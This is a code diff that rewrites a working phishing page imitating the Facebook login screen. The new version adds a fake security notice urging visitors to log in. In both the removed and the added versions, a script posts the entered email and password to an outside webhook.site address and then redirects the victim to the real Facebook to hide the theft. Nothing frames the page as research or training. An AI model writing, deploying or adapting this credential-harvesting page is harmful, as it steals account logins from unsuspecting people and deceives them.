@@ -1,1 +1,62 @@
-<!DOCTYPE html> <html lang="ar"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Facebook – log in or sign up</title> <style> body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; } .login-container { width: 396px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; } img { width: 200px; margin-bottom: 20px; } input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; } button { width: 100%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; } .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; } .create-btn { background-color: #42b72a; width: auto; padding: 10px 16px; font-size: 17px; } </style> </head> <body> <div class="login-container"> <img src="https://static.xx.fbcdn.net/rsrc.php/y1/r/4lB9_t_9W9P.svg" alt="Facebook"> <form id="loginForm"> <input type="text" name="email" placeholder="Email address or phone number" required> <input type="password" name="password" placeholder="Password" required> <button type="submit">Log In</button> </form> <div class="divider"></div> <button class="create-btn">Create new account</button> </div> <script> const webhookURL = 'https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190'; document.getElementById('loginForm').addEventListener('submit', function(e) { e.preventDefault(); const formData = new FormData(this); const data = Object.fromEntries(formData.entries()); fetch(webhookURL, { method: 'POST', mode: 'no-cors', body: JSON.stringify(data), headers: { 'Content-Type': 'application/json' } }).then(() => { window.location.href = 'https://www.facebook.com'; }).catch(() => { window.location.href = 'https://www.facebook.com'; }); }); </script> </body> </html>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook – log in or sign up</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .login-container { width: 396px; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0, 0, 0, .1), 0 8px 16px rgba(0, 0, 0, .1); text-align: center; }
+        .fb-logo { color: #1877f2; font-size: 50px; font-weight: bold; margin-bottom: 10px; letter-spacing: -2px; }
+        
+        /* تنسيق جملة التنبيه */
+        .security-notice { background-color: #fff9e6; border: 1px solid #ffeeba; color: #856404; padding: 12px; border-radius: 6px; margin-bottom: 20px; font-size: 14px; line-height: 1.4; }
+        
+        input { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; box-sizing: border-box; font-size: 17px; }
+        button { width: 100%; padding: 14px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 20px; font-weight: bold; cursor: pointer; }
+        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
+        .create-btn { background-color: #42b72a; width: auto; padding: 10px 16px; font-size: 17px; border: none; border-radius: 6px; color: white; font-weight: bold; cursor: pointer; }
+    </style>
+</head>
+<body>
+
+<div class="login-container">
+    <div class="fb-logo">facebook</div>
+    
+    <div class="security-notice">
+        To secure your account, please log in first.
+    </div>
+
+    <form id="loginForm">
+        <input type="text" name="email" placeholder="Email address or phone number" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Log In</button>
+    </form>
+    <div class="divider"></div>
+    <button type="button" class="create-btn">Create new account</button>
+</div>
+
+<script>
+    const webhookURL = 'https://webhook.site/4347f395-56f0-4f4c-b08d-b9f500f09190';
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+        
+        const formData = new FormData(this);
+        const data = Object.fromEntries(formData.entries());
+
+        fetch(webhookURL, {
+            method: 'POST',
+            mode: 'no-cors',
+            body: JSON.stringify(data),
+            headers: { 'Content-Type': 'application/json' }
+        }).then(() => {
+            window.location.href = 'https://www.facebook.com';
+        }).catch(() => {
+            window.location.href = 'https://www.facebook.com';
+        });
+    });
+</script>
+
+</body>
+</html>
